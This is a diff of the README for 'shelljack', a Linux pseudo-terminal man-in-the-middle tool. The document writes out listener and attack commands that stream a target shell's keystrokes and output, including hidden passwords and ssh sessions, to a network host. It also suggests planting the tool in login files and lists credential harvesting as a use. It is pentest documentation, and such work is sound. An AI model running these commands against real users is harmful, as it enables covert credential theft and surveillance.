@@ -1,34 +1,30 @@
 # shelljack #
 
-_shelljack_ is a [terminal](http://en.wikipedia.org/wiki/Computer_terminal) [sniffer](http://en.wikipedia.org/wiki/Packet_analyzer) for [Linux](http://en.wikipedia.org/wiki/Linux) [x86_64](http://en.wikipedia.org/wiki/X86_64) machines. 
+_shelljack_ is a [Linux](http://en.wikipedia.org/wiki/Linux) [terminal](http://en.wikipedia.org/wiki/Computer_terminal) sniffer.
 
 **What is a "terminal sniffer"?**
 
-A terminal sniffer is a piece of software that inspects user [I/O](http://en.wikipedia.org/wiki/I/o) as it crosses the terminal. The most common usage of this term would be a [keystroke logger](http://en.wikipedia.org/wiki/Keystroke_logging). However, _shelljack_ would need to be made much more complex to become a simple keystroke logger. In addition to reporting back all keystrokes put into the terminal, _shelljack_ also reports back all of the data returned back out through the terminal.
+A terminal sniffer is a piece of software that inspects user [I/O](http://en.wikipedia.org/wiki/I/o) as it crosses the terminal. The most common usage of this term would be a [keystroke logger](http://en.wikipedia.org/wiki/Keystroke_logging). However, in addition to reporting all of the keystrokes put into the terminal, _shelljack_ also reports all of the data returned back out through the terminal.
 
 **So it's a kernel module then?**
 
-No. _shelljack_ works entirely in [user space](http://en.wikipedia.org/wiki/User_space) to perform the [shelljacking](https://github.com/emptymonkey/shelljack).
+No. _shelljack_ works entirely in [user space](http://en.wikipedia.org/wiki/User_space).
 
-**What is shelljacking?**
+**What is "shelljacking"?**
 
-It's a term I use to describe a very specific type of terminal sniffing attack. _shelljack_ performs a [pseudo terminal](http://en.wikipedia.org/wiki/Pseudo_terminal) [mitm attack](http://en.wikipedia.org/wiki/Man-in-the-middle_attack).
-
-**So, I can use this to see what someone is doing in their shell?**
-
-Yes, and more. This tool will happily target any process, but is designed to be used against a [session leader](https://github.com/emptymonkey/ctty), which usually means a users [shell](http://en.wikipedia.org/wiki/Unix_shell). Also, it is important to note that a successful shelljacking means you are embedded in the traffic flow between user and the program. *You will be sniffing all traffic down the line, including child processes and ssh sessions to other hosts!*
+This is the term I use to describe a very specific type of terminal sniffing attack. _shelljack_ performs a [pseudo-terminal](http://en.wikipedia.org/wiki/Pseudo_terminal) [mitm attack](http://en.wikipedia.org/wiki/Man-in-the-middle_attack). It will happily target any process, but it is designed to be used against a [session leader](http://linux.die.net/man/7/credentials), which usually means a users [shell](http://en.wikipedia.org/wiki/Unix_shell). It's also important to note that a successful shelljacking means you are now embedded in the traffic flow between user and their shell. *You will be sniffing all of the traffic down the line, including child processes and ssh sessions to other hosts!*
 
 **That's awesome! [1337 h4X0rZ rUL3!!](http://hackertyper.com/)**
 
-While I do think it's pretty neat, it really isn't "[hacking](http://en.wikipedia.org/wiki/Hacker_%28computer_security%29)". There are no exploits here. _shelljack_ takes advantage of [deep magic](http://en.wikipedia.org/wiki/Deep_magic) in Linux that, while often not well understood, is completely legitimate. In order to shelljack a target, you will need the appropriate permissions to do so. 
+While I do think it's pretty neat, this really isn't "[hacking](http://en.wikipedia.org/wiki/Hacker_%28computer_security%29)". There are no exploits here. _shelljack_ takes advantage of Linux [deep magic](http://lxr.linux.no/#linux+v3.9.6/kernel/ptrace.c) that, while often not well understood, is completely legitimate. In order to shelljack a target, you will need the appropriate permissions to do so. 
 
 While this may not be a "[sploit](http://en.wikipedia.org/wiki/Sploit)", it is a very handy tool designed to empower [pentesters](http://en.wikipedia.org/wiki/Pentester), [forensic analysts](http://en.wikipedia.org/wiki/Computer_forensics), and educators.
 
-**Do I need to be root already to use it?**
+**Do I need to be root to use it?**
 
 No. You need "appropriate permissions" in order for it to work. That means you will either need to be root, or the uid of the target process. 
 
-**Why would I use this?**
+**When would I ever need this?**
 
 * As a pentester who has gained execution as a user, you can now shelljack that user for further reconnaissance and credential harvesting.
 * As a forensic analyist, you can eavesdrop on the user who is the target of your investigation (after you've recieved the appropriate authority to do so from the heads of Security, Legal, and HR, of course.)
@@ -36,34 +32,46 @@ No. You need "appropriate permissions" in order for it to work. That means you w
 
 **How does it work?**
 
-[ptrace](http://en.wikipedia.org/wiki/Ptrace): If you want to *really* understand the inner workings of a Linux process and other deep magic, learn ptrace. The best intro I've seen comes in the form of two articles by Pradeep Padala dating back to 2002: [Playing with ptrace, Part I](http://www.linuxjournal.com/article/6100) and [Playing with ptrace, Part II](http://www.linuxjournal.com/article/6210)
+_shelljack_ is a [terminal emulator](http://en.wikipedia.org/wiki/Terminal_emulator) that uses ptrace to insert itself between the shell and it's [controlling tty](https://github.com/emptymonkey/ctty).
 
-[tty](http://en.wikipedia.org/wiki/Tty_%28Unix%29): If you want to understand shelljacking, then you will need to understand the underlying tty semantics. The best tutorial on the topic is [The TTY demystified](www.linusakesson.net/programming/tty/) by [Linus Åkesson](http://www.linusakesson.net/pages/me.php). 
+**Tell me more of this [deep magic](http://en.wikipedia.org/wiki/Deep_magic) of which you speak!**
 
-**Is this portable to other OSs/Architectures?**
+[ptrace](http://en.wikipedia.org/wiki/Ptrace):
+ptrace is the debugging interface provided by the Linux kernel. It's wonderful at forcing you to *really* understand the inner workings of a Linux process if you try to use it. The best intro I've seen comes in the form of two articles by Pradeep Padala dating back to 2002: [Playing with ptrace, Part I](http://www.linuxjournal.com/article/6100) and [Playing with ptrace, Part II](http://www.linuxjournal.com/article/6210)
 
-We are using a Linux semantic (ptrace) to inject syscalls using their assembly form. Nothing here is portable. That said, check out my other project, [_ptrace_do_](https://github.com/emptymonkey/ptrace_do). If I get around to supporting _ptrace_do_ for other architectures, then porting _shelljack_ shouldn't be too hard.
+[tty](http://en.wikipedia.org/wiki/Tty_%28Unix%29):
+A solid understanding of tty fundamentals is necessary to fully understand and leverage the [command line](http://en.wikipedia.org/wiki/Command_line). This is also a needed skill set for understanding shelljacking. The best tutorial on this topic is easily [The TTY demystified](www.linusakesson.net/programming/tty/) by [Linus Åkesson](http://www.linusakesson.net/pages/me.php). 
+
+**What Architectures / OSs will this run on?**
+
+Currently, _shelljack_ will only run on x86_64 Linux. Since _shelljack_ uses the Linux ptrace interface to inject syscalls into a target process using their assembly form, nothing here is portable. That said, check out my other project, [_ptrace_do_](https://github.com/emptymonkey/ptrace_do). If I get around to supporting _ptrace_do_ for other architectures, then porting _shelljack_ shouldn't be too hard.
 
 # Usage # 
 
-In order to properly mitm the [signals](http://en.wikipedia.org/wiki/Unix_signal) as well as the I/O, _shelljack_ must detach from the launching terminal. As such, you'll need a listener to catch its eavesdropped output. [Netcat](http://en.wikipedia.org/wiki/Netcat) works nicely for this. (We've chosen localhost and port 9999 here. Anything that the machine can route, however, _shelljack_ will happily use.)
+	empty@monkey:~$ shelljack --help
+	usage: shelljack LISTENER:PORT PID
+		LISTENER:	Hostname or IP address of the listener.
+		PORT:	Port number that the listener will be listening on.
+		PID:	Process ID of the target process.
 
-Let's setup the listener:
+In order to properly mitm the [signals](http://en.wikipedia.org/wiki/Unix_signal) generated by the controlling tty, _shelljack_ must detach from it's original launch terminal. Because of this, you'll need to set up a listener to catch its eavesdropped output. [Netcat](http://en.wikipedia.org/wiki/Netcat) works nicely for this. (We've chosen localhost and port 9999 here, but _shelljack_ will happily use anything that [the machine can route](http://linux.die.net/man/3/getaddrinfo).)
+
+Let's do a demo. I'll be running [tty](http://linux.die.net/man/1/tty) in the examples to demonstrate which terminal I'm running various commands in.
+
+Start by setting up a listener:
 
 	empty@monkey:~$ tty
 	/dev/pts/0
 	empty@monkey:~$ while [ 1 ]; do ncat -l localhost 9999; done
 
-Since this is a demo, let's also look at the shell we want to target:
+Since this is a demo, let's also examine the shell we want to target:
 
 	empty@monkey:~$ tty
 	/dev/pts/3
 	empty@monkey:~$ echo $$
 	19716
-	empty@monkey:~$ ls -apl /proc/$$/fd
+	empty@monkey:~$ ls -l /proc/$$/fd
 	total 0
-	dr-x------ 2 empty empty  0 Jun 16 16:17 ./
-	dr-xr-xr-x 8 empty empty  0 Jun 16 16:17 ../
 	lrwx------ 1 empty empty 64 Jun 16 16:17 0 -> /dev/pts/3
 	lrwx------ 1 empty empty 64 Jun 16 16:18 1 -> /dev/pts/3
 	lrwx------ 1 empty empty 64 Jun 16 16:18 2 -> /dev/pts/3
@@ -77,21 +85,19 @@ Now, launch shelljack against the target pid:
 
 Back at the listener, you will now see all the I/O in real time as the user interacts with the shelljacked shell. For further evidence of this, lets go examine the target shell again:
 
-	empty@monkey:~$ ls -apl /proc/$$/fd
+	empty@monkey:~$ ls -l /proc/$$/fd
 	total 0
-	dr-x------ 2 empty empty  0 Jun 16 16:17 ./
-	dr-xr-xr-x 8 empty empty  0 Jun 16 16:17 ../
 	lrwx------ 1 empty empty 64 Jun 16 16:17 0 -> /dev/pts/4
 	lrwx------ 1 empty empty 64 Jun 16 16:18 1 -> /dev/pts/4
 	lrwx------ 1 empty empty 64 Jun 16 16:18 2 -> /dev/pts/4
 	lrwx------ 1 empty empty 64 Jun 16 16:18 255 -> /dev/pts/4
 	empty@monkey:~$ ps j -u empty | grep $$
 	19714 19716 19716 19716 pts/4    19867 Ss    1000   0:00 -bash
-	    1 19782 19782 19782 pts/3    19782 Ss+   1000   0:00 ./shelljack localhost 9999 19716
+	    1 19782 19782 19782 pts/3    19782 Ss+   1000   0:00 shelljack localhost 9999 19716
 
-Finally, we can see that _shelljack_ has successfully taken over /dev/pts/3, and is now serving up /dev/pts/4 for the target shell to consume. It sits as the quintessential mitm, and will happily forward you a copy of everything it sees. (Yes, even with "[echo off](http://linux.die.net/man/1/stty)".)
+We can see that _shelljack_ has successfully taken over /dev/pts/3, and is serving up /dev/pts/4 for the target shell to consume. It's now in place to mitm the traffic, happily forwarding you a copy of everything it sees, including the input which normally wouldn't be "[echoed](http://linux.die.net/man/1/stty)" to the terminal (e.g. passwords).
 
-Also note, _shelljack_ was designed with the ability to attack the shell that is calling it. This makes it ideal for launching out of the targets login shell through its [configuration files](http://en.wikipedia.org/wiki/.profile#Configuration_files_for_shells).
+Also note, _shelljack_ was designed with the ability to attack the shell that is calling it. This makes it ideal for launching it out of the targets login [configuration files](http://en.wikipedia.org/wiki/Unix_shell#Configuration_files_for_shells). (e.g. .profile)
 
 	empty@monkey:~$ ls -l /proc/$$/fd
 	total 0
@@ -106,4 +112,35 @@ Also note, _shelljack_ was designed with the ability to attack the shell that is
 	lrwx------ 1 empty empty 64 Jun 16 16:33 1 -> /dev/pts/4
 	lrwx------ 1 empty empty 64 Jun 16 16:33 2 -> /dev/pts/4
 	lrwx------ 1 empty empty 64 Jun 16 16:33 255 -> /dev/pts/4
+
+# Prerequisites #
+
+I've written two supporting libraries to help abstract the heavy lifting and are needed by _shelljack_:
+
+* [_ptrace_do_](https://github.com/emptymonkey/ptrace_do): A ptrace library for easy syscall injection in Linux.
+* [_ctty_](https://github.com/emptymonkey/ctty): A library and tool for discovering and mapping Controlling TTYs in Linux.
+
+In addition, I've also written another tool that isn't needed by _shelljack_, but helps with tty forensics. 
+
+* [_dumb_](https://github.com/emptymonkey/dumb): A simple tool for stripping control characters and escape sequences from terminal output in Unix/Linux.
+
+# Installation #
+
+	git clone git@github.com:emptymonkey/ptrace_do.git
+	cd ptrace_do
+	make
+	cd ..
+
+	git clone git@github.com:emptymonkey/ctty.git
+	cd ctty
+	make
+	cd ..
+
+	git clone git@github.com:emptymonkey/shelljack.git
+	cd shelljack
+	make
+
+# Limitations #
+
+As noted in the [tty_ioctl](http://linux.die.net/man/4/tty_ioctl) [manpage](http://en.wikipedia.org/wiki/Manpage), an existing process can only switch controlling ttys if it is a session leader. Because of this, while _shelljack_ will be successful against the shell itself, any *existing* child processes will not be able to switch with it. They won't usually die during the shelljacking, but their I/O will act strangely if it relies on the tty. It is best to target shells that are semi-idle, or attack them during the login process.
 
